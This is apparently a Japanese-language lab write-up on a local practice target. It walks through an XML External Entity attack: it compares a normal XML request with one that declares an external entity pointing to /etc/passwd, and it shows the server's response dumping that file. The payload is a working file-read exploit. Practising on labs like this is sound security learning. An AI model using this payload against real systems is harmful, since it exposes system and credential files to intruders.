# XML External Entity Attack

## XML External File Extraction
何をやってるのかいまいち分かりづらい画面。とりあえずリクエストとレスポンスを見る。
```http
POST /lab/xxe/xml/test.php HTTP/1.1
Host: localhost:1337
Content-Length: 58

  <city><title>Karabuk</title><amount>293</amount></city>
  ```

```http
HTTP/1.1 200 OK
Date: Thu, 13 Oct 2022 13:07:01 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 10
Connection: close
Content-Type: text/html; charset=UTF-8

Karabuk293
```
titleとamlountを結合して返しているみたい。

内部参照するエンティティを追加してみる。
```http
POST /lab/xxe/xml/test.php HTTP/1.1
Host: localhost:1337
Content-Length: 122


<!DOCTYPE foo [<!ENTITY hoge SYSTEM "file:///etc/passwd"> ]><city><title>Karabuk&hoge;</title><amount>293</amount></city>
```
```http
HTTP/1.1 200 OK
Date: Thu, 13 Oct 2022 13:09:59 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 992
Connection: close
Content-Type: text/html; charset=UTF-8

Karabukroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false
293
```
